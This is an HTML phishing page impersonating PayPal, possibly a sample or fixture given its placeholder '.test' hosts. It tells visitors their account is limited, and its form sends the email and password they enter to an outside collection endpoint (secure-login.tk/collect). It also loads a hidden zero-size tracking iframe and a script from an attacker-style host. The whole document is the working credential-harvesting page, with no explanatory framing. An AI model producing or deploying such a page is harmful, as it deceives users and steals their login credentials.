<!DOCTYPE html>
<html>
<head>
  <title>PayPal - Verify your account</title>
  <link rel="icon" href="https://cdn.evil-example.test/favicon.ico">
</head>
<body>
  <h1>PayPal Security Verification</h1>
  <p>Your account has been limited. Sign in to verify your identity.</p>
  <form action="https://secure-login.tk/collect" method="post">
    <label>Email <input type="text" name="email"></label>
    <label>Password <input type="password" name="password"></label>
    <button type="submit">Verify my account</button>
  </form>
  <iframe src="https://tracker.evil-example.test/pixel" width="0" height="0" style="display:none"></iframe>
  <img src="https://cdn.evil-example.test/logo.png" alt="logo">
  <script src="https://cdn.evil-example.test/app.js"></script>
  <a href="https://paypal.com">Official PayPal site</a>
  <a href="https://secure-login.tk/help">Help</a>
</body>
</html>
